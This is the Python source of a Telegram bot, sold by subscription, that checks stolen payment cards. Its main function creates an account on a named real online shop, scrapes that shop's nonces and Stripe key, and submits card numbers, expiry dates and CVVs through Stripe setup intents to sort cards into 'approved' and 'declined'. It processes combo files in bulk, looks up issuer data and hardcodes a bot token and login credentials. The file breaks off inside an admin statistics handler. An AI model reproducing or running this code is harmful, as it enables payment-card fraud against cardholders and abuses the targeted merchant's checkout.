
import telebot, os
import re, json
import requests
import time, random
import string
from telebot import types
from datetime import datetime, timedelta
import threading
import user_agent

stopuser = {}
token = '7663740425:AAGRW695J0aymyv3vkblHhYhaCExJtCzS3I'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 8271366133  # ايدي الادمن
command_usage = {}

def reset_command_usage():
    for user_id in command_usage:
        command_usage[user_id] = {'count': 0, 'last_time': None}

def reg(card_details):
    """تنظيف وتنسيق بيانات البطاقة"""
    try:
        # Remove all non-digit characters and separators
        pattern = r'(\d{13,19})[^\d]*(\d{1,2})[^\d]*(\d{2,4})[^\d]*(\d{3,4})'
        match = re.search(pattern, card_details)
        
        if match:
            cc = match.group(1)
            mm = match.group(2).zfill(2)
            yy = match.group(3)
            cvv = match.group(4)
            
            # Convert 2-digit year to 4-digit
            if len(yy) == 2:
                if int(yy) < 30:
                    yy = "20" + yy
                else:
                    yy = "19" + yy
            
            return f"{cc}|{mm}|{yy}|{cvv}"
        else:
            return None
    except:
        return None

def stripe_auth(ccx):
    """Stripe Auth Gateway - البوابة الرئيسية"""
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]

        if "20" in yy:  
            yy = yy.split("20")[1]  
          
        user = user_agent.generate_user_agent()  
        r = requests.session()  
          
        headers = {  
            'authority': 'shop.wiseacrebrew.com',  
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',  
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',  
            'cache-control': 'max-age=0',  
            'referer': 'https://shop.wiseacrebrew.com/',  
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',  
            'sec-ch-ua-mobile': '?1',  
            'sec-ch-ua-platform': '"Android"',  
            'sec-fetch-dest': 'document',  
            'sec-fetch-mode': 'navigate',  
            'sec-fetch-site': 'same-origin',  
            'sec-fetch-user': '?1',  
            'upgrade-insecure-requests': '1',  
            'user-agent': user,  
        }  
          
        response = r.get('https://shop.wiseacrebrew.com/account/', cookies=r.cookies, headers=headers)  
          
        register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)  
          
        headers = {  
            'authority': 'shop.wiseacrebrew.com',  
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',  
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',  
            'cache-control': 'max-age=0',  
            'content-type': 'application/x-www-form-urlencoded',  
            'origin': 'https://shop.wiseacrebrew.com',  
            'referer': 'https://shop.wiseacrebrew.com/account/',  
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',  
            'sec-ch-ua-mobile': '?1',  
            'sec-ch-ua-platform': '"Android"',  
            'sec-fetch-dest': 'document',  
            'sec-fetch-mode': 'navigate',  
            'sec-fetch-site': 'same-origin',  
            'sec-fetch-user': '?1',  
            'upgrade-insecure-requests': '1',  
            'user-agent': user,  
        }  
          
        data = {  
            'email': 'znmmznn13@gmail.com',  
            'password': 'mohamed&mena',  
            'wc_order_attribution_source_type': 'typein',  
            'wc_order_attribution_referrer': '(none)',  
            'wc_order_attribution_utm_campaign': '(none)',  
            'wc_order_attribution_utm_source': '(direct)',  
            'wc_order_attribution_utm_medium': '(none)',  
            'wc_order_attribution_utm_content': '(none)',  
            'wc_order_attribution_utm_id': '(none)',  
            'wc_order_attribution_utm_term': '(none)',  
            'wc_order_attribution_utm_source_platform': '',  
            'wc_order_attribution_utm_creative_format': '',  
            'wc_order_attribution_utm_marketing_tactic': '',  
            'wc_order_attribution_session_entry': 'https://shop.wiseacrebrew.com/',  
            'wc_order_attribution_session_start_time': '2025-05-26 15:35:39',  
            'wc_order_attribution_session_pages': '4',  
            'wc_order_attribution_session_count': '1',  
            'wc_order_attribution_user_agent': user,  
            'woocommerce-register-nonce': register,  
            '_wp_http_referer': '/account/',  
            'register': 'Register',  
        }  
          
        response = r.post('https://shop.wiseacrebrew.com/account/', cookies=r.cookies, headers=headers, data=data)  
          
        headers = {  
            'authority': 'shop.wiseacrebrew.com',  
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',  
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',  
            'referer': 'https://shop.wiseacrebrew.com/account/',  
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',  
            'sec-ch-ua-mobile': '?1',  
            'sec-ch-ua-platform': '"Android"',  
            'sec-fetch-dest': 'document',  
            'sec-fetch-mode': 'navigate',  
            'sec-fetch-site': 'same-origin',  
            'sec-fetch-user': '?1',  
            'upgrade-insecure-requests': '1',  
            'user-agent': user,  
        }  
          
        response = r.get('https://shop.wiseacrebrew.com/account/payment-methods/', cookies=r.cookies, headers=headers)  
          
        nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response.text).group(1)  
        key = re.search(r'"key":"(.*?)"', response.text).group(1)  
          
        headers = {  
            'authority': 'api.stripe.com',  
            'accept': 'application/json',  
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',  
            'content-type': 'application/x-www-form-urlencoded',  
            'origin': 'https://js.stripe.com',  
            'referer': 'https://js.stripe.com/',  
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',  
            'sec-ch-ua-mobile': '?1',  
            'sec-ch-ua-platform': '"Android"',  
            'sec-fetch-dest': 'empty',  
            'sec-fetch-mode': 'cors',  
            'sec-fetch-site': 'same-site',  
            'user-agent': user,  
        }  
          
        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=EG&payment_user_agent=stripe.js%2Fb2e402148c%3B+stripe-js-v3%2Fb2e402148c%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fshop.wiseacrebrew.com&time_on_page=43435&client_attribution_metadata[client_session_id]=b1d4c49b-bc11-4f0f-bddf-1f8933f488cb&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=107665ac-2ab9-441b-b072-659b9253978f62dd41&muid=94b93c7b-6b56-440e-bbc2-47028bcf1c54a62f89&sid=c3cd1d7e-dc02-4e3c-815d-61b85d447a4f4b755c&key={key}&_stripe_version=2024-06-20'  
          
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)  
          
        if response.status_code == 200:  
            tok = response.json()['id']  
              
            headers = {  
                'authority': 'shop.wiseacrebrew.com',  
                'accept': '*/*',  
                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',  
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',  
                'origin': 'https://shop.wiseacrebrew.com',  
                'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',  
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',  
                'sec-ch-ua-mobile': '?1',  
                'sec-ch-ua-platform': '"Android"',  
                'sec-fetch-dest': 'empty',  
                'sec-fetch-mode': 'cors',  
                'sec-fetch-site': 'same-origin',  
                'user-agent': user,  
                'x-requested-with': 'XMLHttpRequest',  
            }  
              
            params = {  
                'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',  
            }  
              
            data = {  
                'action': 'create_and_confirm_setup_intent',  
                'wc-stripe-payment-method': tok,  
                'wc-stripe-payment-type': 'card',  
                '_ajax_nonce': nonce,  
            }  
              
            response = r.post('https://shop.wiseacrebrew.com/', params=params, cookies=r.cookies, headers=headers, data=data)  
            msg = response.text  
              
            if 'succeeded' in msg:  
                return 'Approved'  
            else:  
                return 'Declined'  
        else:  
            return 'Declined'  
              
    except Exception as e:  
        return 'Error'

@bot.message_handler(commands=["start"])
def start(message):
    def my_function():
        gate = ''
        name = message.from_user.first_name
        with open('data.json', 'r') as file:
            json_data = json.load(file)
        id = message.from_user.id

        try:
            BL = (json_data[str(id)]['plan'])
        except:
            BL = '𝗙𝗥𝗘𝗘'
            with open('data.json', 'r') as json_file:
                existing_data = json.load(json_file)
            new_data = {
                id: {
                    "plan": "𝗙𝗥𝗘𝗘",
                    "timer": "none",
                }
            }
            existing_data.update(new_data)
            with open('data.json', 'w') as json_file:
                json.dump(existing_data, json_file, ensure_ascii=False, indent=4)

        if BL == '𝗙𝗥𝗘𝗘':
            keyboard = types.InlineKeyboardMarkup()
            contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥 ✨", url="https://t.me/S_3_S1")
            keyboard.add(contact_button)
            random_number = random.randint(33, 82)
            photo_url = f'https://t.me/GF_MAA/890{random_number}'
            bot.send_photo(chat_id=message.chat.id, photo=photo_url, caption=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
𝑻𝑯𝑰𝑺 𝑷𝑨𝑹𝑻𝑰𝑪𝑼𝑳𝑨𝑹 𝑩𝑶𝑻 𝑰𝑺 𝑵𝑶𝑻 𝑭𝑹𝑬𝑬 
𝑰𝑭 𝒀𝑶𝑼 𝑾𝑨𝑵𝑻 𝑻𝑶 𝑼𝑺𝑬 𝑰𝑻, 𝒀𝑶𝑼 𝑴𝑼𝑺𝑻 𝑷𝑼𝑹𝑪𝑯𝑨𝑺𝑬 𝑨 𝑾𝑬𝑬𝑲𝑳𝒀 𝑶𝑹 𝑴𝑶𝑵𝑻𝑯𝑳𝒀 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 

𝑻𝑯𝑬 𝑩𝑶𝑻'𝑺 𝑱𝑶𝑩 𝑰𝑺 𝑻𝑶 𝑪𝑯𝑬𝑪𝑲 𝑪𝑨𝑹𝑫𝑺

𝑩𝑶𝑻 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 𝑷𝑹𝑰𝑪𝑬𝑺:

𝑬𝑮𝒀𝑷𝑻 
1 𝑾𝑬𝑬𝑲 > 250𝑬𝑮
1 𝑴𝑶𝑵𝑻𝑯 > 600𝑬𝑮

𝑰𝑹𝑨𝑸 
1 𝑾𝑬𝑬𝑲 ➜ 6 𝑨𝑺𝑰𝑨 
1 𝑴𝑶𝑵𝑻𝑯 ➜ 13 𝑨𝑺𝑰𝑨

𝑾𝑶𝑹𝑳𝑫𝑾𝑰𝑫𝑬 ➜ 𝑼𝑺𝑫𝑻 
1 𝑾𝑬𝑬𝑲 ➜ 6$ 
1 𝑴𝑶𝑵𝑻𝑯 ➜ 13$

𝑪𝑳𝑰𝑪𝑲 /𝑪𝑴𝑫𝑺 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾: {BL}</b>''', reply_markup=keyboard)
            return

        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="✨ 𝗝𝗢𝗜𝗡 ✨", url="https://t.me/S_3_S1")
        keyboard.add(contact_button)
        username = message.from_user.first_name
        random_number = random.randint(33, 82)
        photo_url = f'https://t.me/GF_MAA/890/{random_number}'
        bot.send_photo(chat_id=message.chat.id, photo=photo_url, caption=f'''<b>𝑾𝑬𝑳𝑪𝑶𝑴𝑬 {username} 🎊

𝘾𝙡𝙞𝙘𝙠 /cmds 𝙏𝙤 𝙑𝙞𝙚𝙬 𝙏𝙝𝙚 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨 
𝙊𝙧 𝙎𝙚𝙣𝙙 𝙏𝙝𝙚 𝙁𝙞𝙡𝙚 𝘼𝙣𝙙 𝙄 𝙒𝙞𝙡𝙡 𝘾𝙝𝙚𝙘𝙠 𝙄𝙩

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵: {BL}</b>''', reply_markup=keyboard)

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["cmds"])
def cmds_handler(message):
    with open('data.json', 'r') as file:
        json_data = json.load(file)
    id = message.from_user.id
    try:
        BL = (json_data[str(id)]['plan'])
    except:
        BL = '𝗙𝗥𝗘𝗘'
    name = message.from_user.first_name
    keyboard = types.InlineKeyboardMarkup()
    contact_button = types.InlineKeyboardButton(text=f"✨ {BL} ✨", callback_data='plan')
    keyboard.add(contact_button)
    bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗧𝗵𝗲𝘀𝗲 𝗔𝗿𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁'𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀

𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 <code>/chk </code> 𝗻𝘂𝗺𝗯𝗲𝗿|𝗺𝗺|𝘆𝘆|𝗰𝘃𝗰
𝗦𝗧𝗔𝗧𝗨𝗦: 𝗢𝗡𝗟𝗜𝗡𝗘 ✅

𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
• /stats - عرض إحصائيات البوت
• /adduser [ID] [ساعات] - إضافة VIP
• /removeuser [ID] - إزالة VIP
• /code [ساعات] - إنشاء كود اشتراك
• /redeem [كود] - تفعيل كود الاشتراك

𝗪𝗲 𝗪𝗶𝗹𝗹 𝗕𝗲 𝗔𝗱𝗱𝗶𝗻𝗴 𝗦𝗼𝗺𝗲 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 𝗔𝗻𝗱 𝗧𝗼𝗼𝗹𝘀 𝗦𝗼𝗼𝗻</b>''', reply_markup=keyboard)

@bot.message_handler(content_types=["document"])
def main(message):
    name = message.from_user.first_name
    with open('data.json', 'r') as file:
        json_data = json.load(file)
    id = message.from_user.id

    try:
        BL = (json_data[str(id)]['plan'])
    except:
        BL = '𝗙𝗥𝗘𝗘'

    if BL == '𝗙𝗥𝗘𝗘':
        with open('data.json', 'r') as json_file:
            existing_data = json.load(json_file)
        new_data = {
            id: {
                "plan": "𝗙𝗥𝗘𝗘",
                "timer": "none",
            }
        }
        existing_data.update(new_data)
        with open('data.json', 'w') as json_file:
            json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥 ✨", url="https://t.me/S_3_S1")
        keyboard.add(contact_button)
        bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
𝑻𝑯𝑰𝑺 𝑷𝑨𝑹𝑻𝑰𝑪𝑼𝑳𝑨𝑹 𝑩𝑶𝑻 𝑰𝑺 𝑵𝑶𝑻 𝑭𝑹𝑬𝑬 
𝑰𝑭 𝒀𝑶𝑼 𝑾𝑨𝑵𝑻 𝑻𝑶 𝑼𝑺𝑬 𝑰𝑻, 𝒀𝑶𝑼 𝑴𝑼𝑺𝑻 𝑷𝑼𝑹𝑪𝑯𝑨𝑺𝑬 𝑨 𝑾𝑬𝑬𝑲𝑳𝒀 𝑶𝑹 𝑴𝑶𝑵𝑻𝑯𝑳𝒀 𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 

𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗵𝗲 𝗢𝘄𝗻𝗲𝗿 𝗳𝗼𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻</b>''', reply_markup=keyboard)
        return

    # Check subscription expiry
    with open('data.json', 'r') as file:
        json_data = json.load(file)
        date_str = json_data[str(id)]['timer'].split('.')[0]
    try:
        provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
    except Exception as e:
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥 ✨", url="https://t.me/S_3_S1")
        keyboard.add(contact_button)
        bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 𝑬𝑹𝑹𝑶𝑹
𝑪𝒐𝒏𝒕𝒂𝒄𝒕 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓 𝒇𝒐𝒓 𝒉𝒆𝒍𝒑</b>''', reply_markup=keyboard)
        return

    current_time = datetime.now()
    required_duration = timedelta(hours=0)
    if current_time - provided_time > required_duration:
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥 ✨", url="https://t.me/S_3_S1")
        keyboard.add(contact_button)
        bot.send_message(chat_id=message.chat.id, text=f'''<b>𝙔𝙤𝙪𝙧 𝙎𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣 𝙃𝙖𝙨 𝙀𝙭𝙥𝙞𝙧𝙚𝙙 ⏰

𝑪𝒐𝒏𝒕𝒂𝒄𝒕 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓 𝒕𝒐 𝒓𝒆𝒏𝒆𝒘 𝒚𝒐𝒖𝒓 𝒔𝒖𝒃𝒔𝒄𝒓𝒊𝒑𝒕𝒊𝒐𝒏</b>''', reply_markup=keyboard)
        with open('data.json', 'r') as file:
            json_data = json.load(file)
        json_data[str(id)]['timer'] = 'none'
        json_data[str(id)]['plan'] = '𝗙𝗥𝗘𝗘'
        with open('data.json', 'w') as file:
            json.dump(json_data, file, indent=2)
        return

    keyboard = types.InlineKeyboardMarkup()
    contact_button = types.InlineKeyboardButton(text="🔥 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 🔥", callback_data='stripe')
    keyboard.add(contact_button)
    bot.reply_to(message, text='𝘾𝙝𝙤𝙤𝙨𝙚 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝙔𝙤𝙪 𝙒𝙖𝙣𝙩 𝙏𝙤 𝙐𝙨𝙚 ⚡', reply_markup=keyboard)
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    with open("combo.txt", "wb") as w:
        w.write(ee)

@bot.callback_query_handler(func=lambda call: call.data == 'stripe')
def stripe_callback(call):
    def my_function():
        id = call.from_user.id
        gate = '𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛'
        dd = 0
        live = 0
        riskk = 0
        ccnn = 0
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨... ⌛")
        
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                try:
                    stopuser[f'{id}']['status'] = 'start'
                except:
                    stopuser[f'{id}'] = {'status': 'start'}
                
                for cc in lino:
                    if stopuser[f'{id}']['status'] == 'stop':
                        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @S_3_S1')
                        return

                    # Get card info
                    try:
                        data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
                    except:
                        data = {}

                    try:
                        bank = data.get('bank', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
                    except:
                        bank = ('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
                    try:
                        country_flag = data.get('country_flag', '🏳️')
                    except:
                        country_flag = ('🏳️')
                    try:
                        country = data.get('country_name', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
                    except:
                        country = ('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
                    try:
                        brand = data.get('brand', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
                    except:
                        brand = ('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
                    try:
                        card_type = data.get('type', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
                    except:
                        card_type = ('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')

                    start_time = time.time()
                    try:
                        last = str(stripe_auth(cc))
                    except Exception as e:
                        print(e)
                        last = "ERROR"

                    if 'risk' in last.lower():
                        last = 'Risk Detected'
                    elif 'duplicate' in last.lower():
                        last = 'Approved'
                    elif 'funds' in last.lower():
                        last = 'Approved'
                    elif 'avs' in last.lower():
                        last = 'Approved'

                    mes = types.InlineKeyboardMarkup(row_width=1)
                    cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                    status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
                    cm3 = types.InlineKeyboardButton(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {live} ] •", callback_data='x')
                    ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 ☑️ ➜ [ {ccnn} ] •", callback_data='x')
                    cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
                    risk = types.InlineKeyboardButton(f"• 𝙍𝙄𝙎𝙆 🏴‍☠️ ➜ [ {riskk} ] •", callback_data='x')
                    cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
                    stop = types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
                    mes.add(cm1, status, cm3, ccn, risk, cm4, cm5, stop)
                    end_time = time.time()
                    execution_time = end_time - start_time

                    bot.edit_message_text(chat_id=call.message.chat.id, 
                                        message_id=call.message.message_id, 
                                        text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝘼𝙩 𝙂𝙖𝙩𝙚𝙬𝙖𝙮: {gate}

𝗕𝗢𝗧 𝗕𝗬: @S_3_S1''', reply_markup=mes)

                    msg = f'''<b>𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅

𝘾𝘼𝙍𝘿 ➼ <code>{cc}</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➼ {last}
𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ➼ {gate}		
𝙄𝙉𝙁𝙊 ➼ {card_type} - {brand}
𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ➼ {country} {country_flag}
𝘽𝙄𝙉 ➼ {cc[:6]}
𝙄𝙎𝙎𝙐𝙀𝙍 ➼ {bank}
𝙏𝙄𝙈𝙀 ➼ {"{:.1f}".format(execution_time)}s

𝗕𝗢𝗧 𝗕𝗬: @S_3_S1</b>'''

                    if any(word in last.lower() for word in ["funds", "postal", "avs", "added", "duplicate", "approved"]):
                        live += 1
                        bot.send_message(call.from_user.id, msg)
                    elif 'risk' in last.lower():
                        riskk += 1
                    elif 'cvv' in last.lower():
                        ccnn += 1
                    else:
                        dd += 1
                    
                    time.sleep(4)
                    
        except Exception as e:
            print(e)

        stopuser[f'{id}']['status'] = 'start'
        bot.edit_message_text(chat_id=call.message.chat.id, 
                            message_id=call.message.message_id, 
                            text='𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n\n𝗕𝗢𝗧 𝗕𝗬 ➜ @S_3_S1')

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    id = call.from_user.id
    stopuser[f'{id}']['status'] = 'stop'
    bot.answer_callback_query(call.id, "𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✋")

@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def chk_handler(message):
    gate = '𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛'
    name = message.from_user.first_name
    idt = message.from_user.id
    id = message.chat.id

    # Premium check
    with open('data.json', 'r') as json_file:
        json_data = json.load(json_file)

    try:
        BL = (json_data[str(idt)]['plan'])
    except:
        with open('data.json', 'r') as json_file:
            existing_data = json.load(json_file)
        new_data = {
            idt: {
                "plan": "𝗙𝗥𝗘𝗘",
                "timer": "none",
            }
        }
        existing_data.update(new_data)
        with open('data.json', 'w') as json_file:
            json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
        BL = '𝗙𝗥𝗘𝗘'

    if BL == '𝗙𝗥𝗘𝗘':
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥 ✨", url="https://t.me/S_3_S1")
        keyboard.add(contact_button)
        bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
𝑻𝑯𝑰𝑺 𝑷𝑨𝑹𝑻𝑰𝑪𝑼𝑳𝑨𝑹 𝑩𝑶𝑻 𝑰𝑺 𝑵𝑶𝑻 𝑭𝑹𝑬𝑬 
𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗵𝗲 𝗢𝘄𝗻𝗲𝗿 𝗳𝗼𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 ⚡</b>''', reply_markup=keyboard)
        return

    ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙... ⌛").message_id)
    try:
        cc = message.reply_to_message.text
    except:
        cc = message.text
    cc = str(reg(cc))

    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 خطأ في تنسيق البطاقة!
الرجاء إدخال البطاقة بالتنسيق الصحيح:
XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
        return

    start_time = time.time()
    try:
        last = str(stripe_auth(cc))
    except Exception as e:
        last = 'Error'

    try:
        data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
    except:
        data = {}
    try:
        brand = data.get('brand', 'Unknown')
    except:
        brand = 'Unknown'
    try:
        card_type = data.get('type', 'Unknown')
    except:
        card_type = 'Unknown'
    try:
        country = data.get('country_name', 'Unknown')
        country_flag = data.get('country_flag', '🏳️')
    except:
        country = 'Unknown'
        country_flag = '🏳️'
    try:
        bank = data.get('bank', 'Unknown')
    except:
        bank = 'Unknown'
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    msg = f'''<b>𝗥𝗘𝗦𝗨𝗟𝗧 ⚡
			
𝘾𝘼𝙍𝘿 ➼ <code>{cc}</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➼ {last}
𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ➼ {gate}
𝙄𝙉𝙁𝙊 ➼ {card_type} - {brand}
𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ➼ {country} {country_flag}
𝘽𝙄𝙉 ➼ {cc[:6]}
𝙄𝙎𝙎𝙐𝙀𝙍 ➼ {bank}
𝙏𝙄𝙈𝙀 ➼ {"{:.1f}".format(execution_time)}s

𝗕𝗢𝗧 𝗕𝗬: @S_3_S1</b>'''
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def redeem_handler(message):
    def my_function():
        try:
            re = message.text.split(' ')[1]
            with open('data.json', 'r') as file:
                json_data = json.load(file)
            timer = (json_data[re]['time'])
            typ = (json_data[f"{re}"]["plan"])
            json_data[f"{message.from_user.id}"]['timer'] = timer
            json_data[f"{message.from_user.id}"]['plan'] = typ
            with open('data.json', 'w') as file:
                json.dump(json_data, file, indent=2)
            with open('data.json', 'r') as json_file:
                data = json.load(json_file)
            del data[re]
            with open('data.json', 'w') as json_file:
                json.dump(data, json_file, ensure_ascii=False, indent=4)
            msg = f'''<b>𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗 ✅

𝙀𝙓𝙋𝙄𝙍𝙀𝙎 ➜ {timer}
𝙋𝙇𝘼𝙉 ➜ {typ}

𝙀𝙣𝙟𝙤𝙮 𝙮𝙤𝙪𝙧 𝙨𝙪𝙗𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣! 🎊</b>'''
            bot.reply_to(message, msg, parse_mode="HTML")
        except Exception as e:
            print('ERROR : ', e)
            bot.reply_to(message, '<b>كود خاطئ أو تم استخدامه مسبقاً ❌</b>', parse_mode="HTML")

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["stats"])
def stats_handler(message):
    """عرض إحصائيات البوت - خاص بالادمن فقط"""
    if message.from_user.id != admin:
        bot.reply_to(message, '<b>غير مصرح لك بهذا الأمر ❌</b>', parse_mode="HTML")
        return
    
    with open('data.json', 'r') as file:
        json_data = json.load(file)
    
    total_users = len(json_data)
